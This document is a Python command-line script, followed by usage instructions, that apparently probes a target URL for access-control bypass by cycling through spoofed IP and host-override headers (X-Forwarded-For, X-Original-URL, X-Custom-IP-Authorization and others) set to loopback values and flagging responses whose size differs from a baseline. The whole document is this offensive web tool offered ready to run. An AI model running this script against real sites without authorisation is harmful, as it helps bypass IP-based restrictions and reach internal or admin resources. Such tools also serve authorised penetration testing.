import requests
import argparse
import urllib.parse
import sys

headers = ["Client-IP", "Connection", "Contact", "Forwarded", "From", "Host", "Origin", "Referer", "True-Client-IP", "X-Client-IP", "X-Custom-IP-Authorization", "X-Forward-For", "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server", "X-Host", "X-HTTP-Host-Override", "X-Original-URL", "X-Originating-IP", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Rewrite-URL", "X-Wap-Profile"]
inject = ["127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1", "2130706433"]

def resolve_content_length(session, url, header_name, header_value):
    session.headers.update({header_name: header_value})
    response = session.get(url)
    content_length = response.headers.get("Content-Length")

    if content_length is None:
        content_length = len(response.content)

    return content_length

def header_inject(url, payload_file=None, timeout=10000):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})
    session.timeout = timeout / 1000

    # Baseline request
    baseline_response = session.get(url)
    baseline_content_length = baseline_response.headers.get("Content-Length")

    if baseline_content_length is None:
        baseline_content_length = len(baseline_response.content)

    # Loop through default payloads and inject
    for header in headers:
        for value in inject:
            session.headers.update({header: value})
            response = session.get(url)
            content_length = response.headers.get("Content-Length")

            if content_length is None:
                content_length = len(response.content)

            if content_length != baseline_content_length:
                print(f"[+] [{url}] [{header}: {value}] [Code: {response.status_code}] [Size: {content_length}]")
            else:
                print(f"[-] [{url}] [{header}: {value}] [Code: {response.status_code}] [Size: {content_length}]")

def main():
    parser = argparse.ArgumentParser(description="Perform header injection and compare response Content-Length")
    parser.add_argument("-u", "--url", required=True, help="URL to fetch and perform header injections")
    parser.add_argument("-p", "--payload-file", help="File with custom header values (useful to provide internal IP)")
    parser.add_argument("-t", "--timeout", type=int, default=10000, help="Custom HTTP timeout in milliseconds")
    args = parser.parse_args()

    url = urllib.parse.urlparse(args.url)

    if not url.scheme or not url.netloc or not url.path:
        print("Invalid URL:", args.url)
        sys.exit(1)

    if args.payload_file:
        with open(args.payload_file, "r") as file:
            inject.clear()
            inject.extend(file.read().splitlines())

    header_inject(args.url, args.payload_file, args.timeout)

if __name__ == "__main__":
    main()

To run the Python script, make sure you have the requests library installed (pip install requests) and save the code in a file with a .py extension (e.g., header_inject.py). Then, you can run the script using the command python header_inject.py -u <url> -p <payload_file> -t <timeout>, replacing <url>, <payload_file>, and <timeout> with the desired values.


  
